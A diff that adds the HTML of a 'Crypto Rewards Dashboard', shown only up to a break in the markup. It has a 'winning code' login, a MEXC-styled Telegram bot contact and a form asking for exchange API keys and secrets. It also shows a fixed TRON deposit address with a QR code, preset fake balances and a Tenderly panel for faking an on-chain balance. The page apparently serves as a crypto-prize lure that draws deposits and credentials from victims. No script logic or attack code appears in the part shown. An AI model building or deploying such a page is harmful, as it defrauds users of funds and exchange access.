@@ -1,0 +1,3656 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Rewards Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@twa-dev/sdk@6.9.0/dist/twa.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script>
+        tailwind.config = {
+            darkMode: 'class',
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#5D5CDE',
+                        secondary: '#4E4DC2',
+                        dark: {
+                            bg: '#181818',
+                            card: '#222222',
+                            text: '#E0E0E0'
+                        },
+                        light: {
+                            bg: '#FFFFFF',
+                            card: '#F5F5F5',
+                            text: '#333333'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: translateY(10px); }
+            100% { opacity: 1; transform: translateY(0); }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+        
+        .chart-container {
+            position: relative;
+            height: 240px;
+            width: 100%;
+        }
+        
+        /* Custom scrollbar for dark mode */
+        .dark ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        .dark ::-webkit-scrollbar-track {
+            background: #222;
+        }
+
+        .dark ::-webkit-scrollbar-thumb {
+            background: #444;
+            border-radius: 4px;
+        }
+
+        /* Shimmer effect for loading */
+        @keyframes shimmer {
+            0% { background-position: -468px 0 }
+            100% { background-position: 468px 0 }
+        }
+        
+        .shimmer {
+            background: linear-gradient(to right, #f6f7f8 8%, #edeef1 18%, #f6f7f8 33%);
+            background-size: 800px 104px;
+            animation: shimmer 1.5s infinite linear;
+        }
+        
+        .dark .shimmer {
+            background: linear-gradient(to right, #2a2a2a 8%, #333 18%, #2a2a2a 33%);
+            background-size: 800px 104px;
+            animation: shimmer 1.5s infinite linear;
+        }
+        
+        /* Telegram theme adjustments */
+        body.telegram-app {
+            background-color: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+        }
+        
+        .telegram-app .bg-light-card {
+            background-color: var(--tg-theme-secondary-bg-color, #f5f5f5);
+        }
+        
+        .telegram-app .text-light-text {
+            color: var(--tg-theme-text-color, #000000);
+        }
+        
+        .telegram-app .primary-button {
+            background-color: var(--tg-theme-button-color, #5D5CDE);
+            color: var(--tg-theme-button-text-color, #ffffff);
+        }
+        
+        .telegram-app .hint-color {
+            color: var(--tg-theme-hint-color, #999999);
+        }
+        
+        .telegram-app .link-color {
+            color: var(--tg-theme-link-color, #5D5CDE);
+        }
+
+        /* Trading view styles */
+        .order-book-row:hover {
+            background-color: rgba(93, 92, 222, 0.1);
+        }
+
+        .dark .order-book-row:hover {
+            background-color: rgba(93, 92, 222, 0.2);
+        }
+
+        /* Tab styles */
+        .tab-active {
+            border-bottom: 2px solid #5D5CDE;
+            color: #5D5CDE;
+        }
+
+        .dark .tab-active {
+            border-bottom: 2px solid #5D5CDE;
+            color: #E0E0E0;
+        }
+
+        /* Trading interface */
+        .price-up {
+            color: #10B981;
+        }
+
+        .price-down {
+            color: #EF4444;
+        }
+
+        /* Animated placeholders */
+        @keyframes placeholderPulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        .placeholder-pulse {
+            animation: placeholderPulse 1.5s infinite ease-in-out;
+            background: #f0f0f0;
+            border-radius: 4px;
+        }
+
+        .dark .placeholder-pulse {
+            background: #2a2a2a;
+        }
+    </style>
+</head>
+<body class="min-h-screen transition-colors duration-300 bg-light-bg dark:bg-dark-bg text-light-text dark:text-dark-text">
+    <div class="container mx-auto px-4 py-8">
+        <!-- Login Screen -->
+        <div id="login-screen" class="flex flex-col items-center justify-center min-h-[80vh]">
+            <div class="w-full max-w-md bg-light-card dark:bg-dark-card rounded-xl shadow-lg p-8 mb-8 fade-in">
+                <div class="text-center mb-8">
+                    <div class="flex justify-center mb-4">
+                        <div class="h-20 w-20 bg-primary rounded-full flex items-center justify-center">
+                            <i class="fas fa-coins text-white text-3xl"></i>
+                        </div>
+                    </div>
+                    <h1 class="text-2xl font-bold mb-1">Crypto Rewards</h1>
+                    <p class="text-gray-500 dark:text-gray-400">Enter your winning code to access rewards</p>
+                </div>
+                
+                <div class="mb-6">
+                    <label for="code-input" class="block text-sm font-medium mb-2">Winning Code</label>
+                    <input type="text" id="code-input" class="w-full text-base px-4 py-3 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800 focus:outline-none focus:ring-2 focus:ring-primary transition" placeholder="Enter your winning code">
+                    <p id="error-message" class="text-red-500 mt-2 text-sm hidden">Invalid code. Please try again.</p>
+                </div>
+                
+                <button id="submit-btn" class="w-full primary-button bg-primary hover:bg-secondary text-white font-medium py-3 px-4 rounded-lg transition-colors duration-300 flex items-center justify-center">
+                    <span>Access Dashboard</span>
+                    <i class="fas fa-arrow-right ml-2"></i>
+                </button>
+                
+                <div id="telegram-login-btn" class="hidden mt-4 w-full bg-blue-500 hover:bg-blue-600 text-white font-medium py-3 px-4 rounded-lg transition-colors duration-300 flex items-center justify-center">
+                    <i class="fab fa-telegram mr-2"></i>
+                    <span>Continue with Telegram</span>
+                </div>
+            </div>
+            
+            <div class="text-center text-sm text-gray-500 dark:text-gray-400">
+                <p>Need help? Contact support@cryptorewards.com</p>
+                <p class="mt-2">or message @mexcrewardrobot on Telegram</p>
+            </div>
+        </div>
+        
+        <!-- Dashboard Screen (Initially Hidden) -->
+        <div id="dashboard-screen" class="hidden">
+            <div class="flex justify-between items-center mb-6">
+                <div>
+                    <h1 class="text-2xl font-bold">Crypto Rewards Dashboard</h1>
+                    <p id="user-welcome" class="text-gray-500 dark:text-gray-400">Welcome to your portfolio</p>
+                </div>
+                <div class="flex items-center">
+                    <button id="theme-toggle" class="p-2 rounded-full hover:bg-gray-200 dark:hover:bg-gray-700 transition-colors">
+                        <i class="fas fa-moon dark:hidden"></i>
+                        <i class="fas fa-sun hidden dark:block"></i>
+                    </button>
+                    <div id="user-avatar" class="ml-4 p-2 rounded-full bg-gray-200 dark:bg-gray-700 flex items-center justify-center">
+                        <i class="fas fa-user text-primary"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Loading Indicator -->
+            <div id="dashboard-loading" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-6 flex flex-col items-center">
+                    <div class="w-12 h-12 border-4 border-primary border-t-transparent rounded-full animate-spin mb-4"></div>
+                    <p class="text-gray-700 dark:text-gray-300">Loading your crypto data...</p>
+                </div>
+            </div>
+            
+            <!-- API Settings Modal -->
+            <div id="api-settings-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md mx-4">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">API Settings</h2>
+                        <button id="close-api-settings" class="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Exchange</label>
+                        <select id="exchange-select" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800">
+                            <option value="binance">Binance</option>
+                            <option value="coinbase">Coinbase</option>
+                            <option value="mexc">MEXC</option>
+                        </select>
+                    </div>
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">API Key</label>
+                        <input type="text" id="api-key-input" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" placeholder="Enter your API key">
+                    </div>
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">API Secret</label>
+                        <input type="password" id="api-secret-input" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" placeholder="Enter your API secret">
+                    </div>
+                    <div class="text-xs text-gray-500 dark:text-gray-400 mb-4">
+                        <p class="mb-2">⚠️ Important security notes:</p>
+                        <ul class="list-disc pl-4 space-y-1">
+                            <li>API keys are stored only in your browser's memory</li>
+                            <li>They are never sent to our servers</li>
+                            <li>Create an API key with read-only permissions for best security</li>
+                        </ul>
+                    </div>
+                    <div class="flex justify-end">
+                        <button id="save-api-settings" class="bg-primary hover:bg-secondary text-white font-medium py-2 px-4 rounded-lg transition-colors">Save Settings</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Tenderly Settings Modal -->
+            <div id="tenderly-settings-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md mx-4">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Tenderly Integration</h2>
+                        <button id="close-tenderly-settings" class="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">RPC URL</label>
+                        <input type="text" id="tenderly-rpc-url" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" placeholder="Tenderly RPC URL" value="https://virtual.mainnet.rpc.tenderly.co/5acdd816-c0ec-478b-bdb5-0b41af26fde1" readonly="">
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Fee Address</label>
+                        <input type="text" id="tenderly-fee-address" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" placeholder="Fee address" value="0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D">
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">User Address</label>
+                        <input type="text" id="tenderly-user-address" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" placeholder="User address" value="0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266">
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Initial Balance (ETH)</label>
+                        <input type="number" id="tenderly-balance" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" placeholder="Balance in ETH" value="1">
+                    </div>
+                    
+                    <div class="mb-4">
+                        <p class="text-xs text-gray-500 dark:text-gray-400">
+                            <i class="fas fa-info-circle mr-1"></i> This will set the balance on Tenderly's virtual Ethereum mainnet for testing purposes.
+                        </p>
+                    </div>
+                    
+                    <div class="flex justify-between">
+                        <button id="verify-tenderly" class="px-3 py-2 bg-blue-500 hover:bg-blue-600 text-white font-medium rounded-lg transition-colors text-sm">
+                            <i class="fas fa-check-circle mr-1"></i> Verify Transaction
+                        </button>
+                        <button id="set-tenderly-balance" class="px-3 py-2 bg-primary hover:bg-secondary text-white font-medium rounded-lg transition-colors">Set Balance</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Deposit Modal -->
+            <div id="deposit-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md mx-4">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Deposit Crypto</h2>
+                        <button id="close-deposit-modal" class="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Select Coin</label>
+                        <select id="deposit-coin" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800">
+                            <option value="BTC">Bitcoin (BTC)</option>
+                            <option value="ETH">Ethereum (ETH)</option>
+                            <option value="USDT" selected="">Tether (USDT)</option>
+                            <option value="BNB">Binance Coin (BNB)</option>
+                        </select>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Network</label>
+                        <select id="deposit-network" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800">
+                            <option value="ETH">Ethereum (ERC20)</option>
+                            <option value="BSC">BNB Smart Chain (BEP20)</option>
+                            <option value="TRX">TRON (TRC20)</option>
+                        </select>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Deposit Address</label>
+                        <div class="relative">
+                            <input type="text" id="deposit-address" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" value="TXEJbFyKSGN6aZV5WgT1xbKLhMmXXqdTrK" readonly="">
+                            <button id="copy-address" class="absolute right-2 top-2 text-primary hover:text-secondary">
+                                <i class="far fa-copy"></i>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-6 flex justify-center">
+                        <div id="qr-code" class="w-48 h-48 bg-white p-2 rounded-lg">
+                            <!-- QR code will be displayed here -->
+                            <img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&amp;data=TXEJbFyKSGN6aZV5WgT1xbKLhMmXXqdTrK" alt="QR Code" class="w-full h-full">
+                        </div>
+                    </div>
+                    
+                    <div class="bg-yellow-50 dark:bg-yellow-900 text-yellow-800 dark:text-yellow-200 p-3 rounded-lg text-xs mb-4">
+                        <p class="flex items-start">
+                            <i class="fas fa-exclamation-triangle mr-2 mt-0.5"></i>
+                            <span>
+                                Please only send <span id="deposit-coin-name">USDT</span> to this address. Sending any other coin may result in permanent loss.
+                                <br><br>
+                                <strong>For demo purposes</strong>: After sending, click the "Simulate Deposit" button below to credit your account.
+                            </span>
+                        </p>
+                    </div>
+                    
+                    <div class="flex justify-center">
+                        <button id="simulate-deposit" class="bg-primary hover:bg-secondary text-white font-medium py-2 px-4 rounded-lg transition-colors">
+                            <i class="fas fa-magic mr-1"></i> Simulate Deposit
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Send Modal -->
+            <div id="send-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md mx-4">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Send Crypto</h2>
+                        <button id="close-send-modal" class="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Select Coin</label>
+                        <select id="send-coin" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800">
+                            <option value="BTC">Bitcoin (BTC) - 0.085 BTC Available</option>
+                            <option value="ETH">Ethereum (ETH) - 0.75 ETH Available</option>
+                            <option value="USDT" selected="">Tether (USDT) - 2500 USDT Available</option>
+                        </select>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Network</label>
+                        <select id="send-network" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800">
+                            <option value="ETH">Ethereum (ERC20)</option>
+                            <option value="BSC">BNB Smart Chain (BEP20)</option>
+                            <option value="TRX" selected="">TRON (TRC20)</option>
+                        </select>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Recipient Address</label>
+                        <input type="text" id="recipient-address" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" placeholder="Enter recipient address">
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">Amount</label>
+                        <div class="relative">
+                            <input type="number" id="send-amount" class="w-full text-base px-4 py-2 rounded-lg border border-gray-300 dark:border-gray-700 bg-white dark:bg-gray-800" placeholder="0.00">
+                            <button id="send-max" class="absolute right-2 top-2 text-xs px-2 py-1 bg-gray-200 dark:bg-gray-700 rounded text-gray-600 dark:text-gray-300 hover:bg-gray-300 dark:hover:bg-gray-600">MAX</button>
+                        </div>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <div class="flex justify-between text-sm text-gray-600 dark:text-gray-400">
+                            <span>Network Fee:</span>
+                            <span id="network-fee">~1.2 USDT</span>
+                        </div>
+                        <div class="flex justify-between text-sm text-gray-600 dark:text-gray-400 mt-1">
+                            <span>You will send:</span>
+                            <span id="total-send-amount">0 USDT</span>
+                        </div>
+                    </div>
+                    
+                    <div class="flex justify-end">
+                        <button id="confirm-send" class="bg-primary hover:bg-secondary text-white font-medium py-2 px-4 rounded-lg transition-colors">Send</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Swap Modal -->
+            <div id="swap-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-md mx-4">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Swap Crypto</h2>
+                        <button id="close-swap-modal" class="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="mb-3">
+                        <label class="block text-sm font-medium mb-2">From</label>
+                        <div class="flex rounded-lg border border-gray-300 dark:border-gray-700 overflow-hidden">
+                            <select id="from-coin" class="text-base px-4 py-3 bg-gray-100 dark:bg-gray-700 border-r border-gray-300 dark:border-gray-600">
+                                <option value="BTC">BTC</option>
+                                <option value="ETH">ETH</option>
+                                <option value="USDT" selected="">USDT</option>
+                            </select>
+                            <input type="number" id="from-amount" class="flex-1 text-base px-4 py-3 bg-white dark:bg-gray-800 focus:outline-none" placeholder="0.00">
+                        </div>
+                        <div class="text-right text-xs text-gray-500 dark:text-gray-400 mt-1">
+                            Available: <span id="from-available">2500 USDT</span>
+                        </div>
+                    </div>
+                    
+                    <div class="flex justify-center my-2">
+                        <button id="swap-direction" class="w-10 h-10 bg-gray-200 dark:bg-gray-700 rounded-full flex items-center justify-center hover:bg-gray-300 dark:hover:bg-gray-600 transition-colors">
+                            <i class="fas fa-exchange-alt"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium mb-2">To</label>
+                        <div class="flex rounded-lg border border-gray-300 dark:border-gray-700 overflow-hidden">
+                            <select id="to-coin" class="text-base px-4 py-3 bg-gray-100 dark:bg-gray-700 border-r border-gray-300 dark:border-gray-600">
+                                <option value="BTC" selected="">BTC</option>
+                                <option value="ETH">ETH</option>
+                                <option value="USDT">USDT</option>
+                            </select>
+                            <input type="number" id="to-amount" class="flex-1 text-base px-4 py-3 bg-white dark:bg-gray-800 focus:outline-none" placeholder="0.00" readonly="">
+                        </div>
+                    </div>
+                    
+                    <div class="bg-gray-100 dark:bg-gray-700 rounded-lg p-3 mb-4">
+                        <div class="flex justify-between text-sm">
+                            <span class="text-gray-600 dark:text-gray-400">Exchange Rate:</span>
+                            <span id="exchange-rate">1 USDT ≈ 0.0000334 BTC</span>
+                        </div>
+                        <div class="flex justify-between text-sm mt-1">
+                            <span class="text-gray-600 dark:text-gray-400">Fee:</span>
+                            <span id="swap-fee">0.1% (0.25 USDT)</span>
+                        </div>
+                        <div class="flex justify-between text-sm mt-1">
+                            <span class="text-gray-600 dark:text-gray-400">Minimum Received:</span>
+                            <span id="min-received">0.00083166 BTC</span>
+                        </div>
+                    </div>
+                    
+                    <button id="confirm-swap" class="w-full bg-primary hover:bg-secondary text-white font-medium py-3 px-4 rounded-lg transition-colors">Swap</button>
+                </div>
+            </div>
+            
+            <!-- Trading Interface Modal -->
+            <div id="trading-modal" class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+                <div class="bg-white dark:bg-gray-800 rounded-lg p-4 w-full max-w-4xl mx-4 max-h-[90vh] overflow-hidden flex flex-col">
+                    <div class="flex justify-between items-center mb-4">
+                        <h2 class="text-xl font-bold">Trading Interface</h2>
+                        <button id="close-trading-modal" class="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
+                            <i class="fas fa-times"></i>
+                        </button>
+                    </div>
+                    
+                    <div class="flex flex-col md:flex-row gap-4 h-full overflow-hidden">
+                        <!-- Left panel: Chart and order book -->
+                        <div class="w-full md:w-2/3 flex flex-col overflow-hidden">
+                            <!-- Trading pair selector -->
+                            <div class="flex items-center mb-2 bg-gray-100 dark:bg-gray-700 rounded-lg p-2">
+                                <select id="trading-pair" class="bg-transparent text-base focus:outline-none">
+                                    <option value="BTCUSDT" selected="">BTC/USDT</option>
+                                    <option value="ETHUSDT">ETH/USDT</option>
+                                    <option value="BNBUSDT">BNB/USDT</option>
+                                    <option value="SOLUSDT">SOL/USDT</option>
+                                </select>
+                                <div class="ml-4">
+                                    <span id="current-price" class="text-base font-bold price-up">29,850.20</span>
+                                    <span id="price-change" class="ml-2 text-xs text-green-500">+2.4%</span>
+                                </div>
+                                <div class="ml-auto flex space-x-1">
+                                    <button class="chart-period-btn px-2 py-1 text-xs rounded-md bg-primary text-white">15m</button>
+                                    <button class="chart-period-btn px-2 py-1 text-xs rounded-md bg-gray-200 dark:bg-gray-600">1h</button>
+                                    <button class="chart-period-btn px-2 py-1 text-xs rounded-md bg-gray-200 dark:bg-gray-600">4h</button>
+                                    <button class="chart-period-btn px-2 py-1 text-xs rounded-md bg-gray-200 dark:bg-gray-600">1d</button>
+                                </div>
+                            </div>
+                            
+                            <!-- Price chart -->
+                            <div class="flex-grow bg-white dark:bg-gray-900 rounded-lg p-2 mb-2 overflow-hidden">
+                                <div class="chart-container h-60">
+                                    <canvas id="tradingChart" class="w-full h-full"></canvas>
+                                </div>
+                            </div>
+                            
+                            <!-- Order book -->
+                            <div class="h-52 bg-white dark:bg-gray-900 rounded-lg p-2 overflow-hidden flex flex-col">
+                                <div class="flex justify-between items-center mb-2">
+                                    <h3 class="text-sm font-medium">Order Book</h3>
+                                    <div class="flex text-xs">
+                                        <button class="px-2 py-0.5 bg-gray-200 dark:bg-gray-700 rounded-l-md">0.01</button>
+                                        <button class="px-2 py-0.5 bg-gray-300 dark:bg-gray-600 rounded-r-md">0.1</button>
+                                    </div>
+                                </div>
+                                
+                                <div class="flex text-xs text-gray-600 dark:text-gray-400 border-b border-gray-200 dark:border-gray-700 pb-1 mb-1">
+                                    <div class="w-1/3">Price (USDT)</div>
+                                    <div class="w-1/3 text-right">Amount (BTC)</div>
+                                    <div class="w-1/3 text-right">Total</div>
+                                </div>
+                                
+                                <div class="overflow-y-auto flex-grow">
+                                    <!-- Sell orders (red) -->
+                                    <div id="sell-orders" class="text-xs">
+                                        <div class="order-book-row flex text-red-500 hover:bg-gray-100 dark:hover:bg-gray-800 py-0.5">
+                                            <div class="w-1/3">29,875.20</div>
+                                            <div class="w-1/3 text-right">0.354</div>
+                                            <div class="w-1/3 text-right">10,575.82</div>
+                                        </div>
+                                        <div class="order-book-row flex text-red-500 hover:bg-gray-100 dark:hover:bg-gray-800 py-0.5">
+                                            <div class="w-1/3">29,870.15</div>
+                                            <div class="w-1/3 text-right">0.125</div>
+                                            <div class="w-1/3 text-right">3,733.77</div>
+                                        </div>
+                                        <div class="order-book-row flex text-red-500 hover:bg-gray-100 dark:hover:bg-gray-800 py-0.5">
+                                            <div class="w-1/3">29,865.30</div>
+                                            <div class="w-1/3 text-right">0.789</div>
+                                            <div class="w-1/3 text-right">23,563.72</div>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Current price -->
+                                    <div class="py-1 text-xs text-primary font-medium border-y border-gray-200 dark:border-gray-700">
+                                        <div class="flex justify-between">
+                                            <span>29,850.20</span>
+                                            <span>≈ $29,850.20</span>
+                                        </div>
+                                    </div>
+                                    
+                                    <!-- Buy orders (green) -->
+                                    <div id="buy-orders" class="text-xs">
+                                        <div class="order-book-row flex text-green-500 hover:bg-gray-100 dark:hover:bg-gray-800 py-0.5">
+                                            <div class="w-1/3">29,845.10</div>
+                                            <div class="w-1/3 text-right">0.215</div>
+                                            <div class="w-1/3 text-right">6,416.70</div>
+                                        </div>
+                                        <div class="order-book-row flex text-green-500 hover:bg-gray-100 dark:hover:bg-gray-800 py-0.5">
+                                            <div class="w-1/3">29,840.25</div>
+                                            <div class="w-1/3 text-right">0.524</div>
+                                            <div class="w-1/3 text-right">15,636.29</div>
+                                        </div>
+                                        <div class="order-book-row flex text-green-500 hover:bg-gray-100 dark:hover:bg-gray-800 py-0.5">
+                                            <div class="w-1/3">29,835.00</div>
+                                            <div class="w-1/3 text-right">1.258</div>
+                                            <div class="w-1/3 text-right">37,532.43</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Right panel: Order form and open orders -->
+                        <div class="w-full md:w-1/3 flex flex-col overflow-hidden">
+                            <!-- Order form tabs -->
+                            <div class="flex border-b border-gray-200 dark:border-gray-700 mb-2">
+                                <button class="trade-tab px-4 py-2 text-sm font-medium tab-active" data-tab="limit">Limit</button>
+                                <button class="trade-tab px-4 py-2 text-sm font-medium" data-tab="market">Market</button>
+                                <button class="trade-tab px-4 py-2 text-sm font-medium" data-tab="stop">Stop-Limit</button>
+                            </div>
+                            
+                            <!-- Order form -->
+                            <div class="bg-white dark:bg-gray-900 rounded-lg p-3 mb-2">
+                                <div class="mb-2">
+                                    <div class="flex justify-between mb-1">
+                                        <span class="text-xs text-gray-600 dark:text-gray-400">Available:</span>
+                                        <span class="text-xs">2,500 USDT</span>
+                                    </div>
+                                    <div class="flex border border-gray-300 dark:border-gray-700 rounded-lg overflow-hidden">
+                                        <div class="px-3 py-2 text-xs bg-gray-100 dark:bg-gray-700 flex items-center">Price</div>
+                                        <input type="number" id="trade-price" class="flex-1 px-2 py-2 text-xs bg-white dark:bg-gray-800 focus:outline-none" placeholder="Price" value="29850.20">
+                                        <div class="px-3 py-2 text-xs bg-gray-100 dark:bg-gray-700">USDT</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="mb-2">
+                                    <div class="flex border border-gray-300 dark:border-gray-700 rounded-lg overflow-hidden">
+                                        <div class="px-3 py-2 text-xs bg-gray-100 dark:bg-gray-700 flex items-center">Amount</div>
+                                        <input type="number" id="trade-amount" class="flex-1 px-2 py-2 text-xs bg-white dark:bg-gray-800 focus:outline-none" placeholder="Amount">
+                                        <div class="px-3 py-2 text-xs bg-gray-100 dark:bg-gray-700">BTC</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="flex space-x-1 mb-3">
+                                    <button class="amount-percent-btn flex-1 py-1 text-xs bg-gray-100 dark:bg-gray-700 rounded-md hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors">25%</button>
+                                    <button class="amount-percent-btn flex-1 py-1 text-xs bg-gray-100 dark:bg-gray-700 rounded-md hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors">50%</button>
+                                    <button class="amount-percent-btn flex-1 py-1 text-xs bg-gray-100 dark:bg-gray-700 rounded-md hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors">75%</button>
+                                    <button class="amount-percent-btn flex-1 py-1 text-xs bg-gray-100 dark:bg-gray-700 rounded-md hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors">100%</button>
+                                </div>
+                                
+                                <div class="mb-2">
+                                    <div class="flex border border-gray-300 dark:border-gray-700 rounded-lg overflow-hidden">
+                                        <div class="px-3 py-2 text-xs bg-gray-100 dark:bg-gray-700 flex items-center">Total</div>
+                                        <input type="number" id="trade-total" class="flex-1 px-2 py-2 text-xs bg-white dark:bg-gray-800 focus:outline-none" placeholder="Total">
+                                        <div class="px-3 py-2 text-xs bg-gray-100 dark:bg-gray-700">USDT</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="grid grid-cols-2 gap-2">
+                                    <button id="buy-btn" class="py-2 text-sm font-medium bg-green-500 hover:bg-green-600 text-white rounded-lg transition-colors">Buy BTC</button>
+                                    <button id="sell-btn" class="py-2 text-sm font-medium bg-red-500 hover:bg-red-600 text-white rounded-lg transition-colors">Sell BTC</button>
+                                </div>
+                            </div>
+                            
+                            <!-- Open orders -->
+                            <div class="flex-grow bg-white dark:bg-gray-900 rounded-lg p-3 overflow-hidden flex flex-col">
+                                <h3 class="text-sm font-medium mb-2">Open Orders</h3>
+                                
+                                <div class="overflow-y-auto flex-grow">
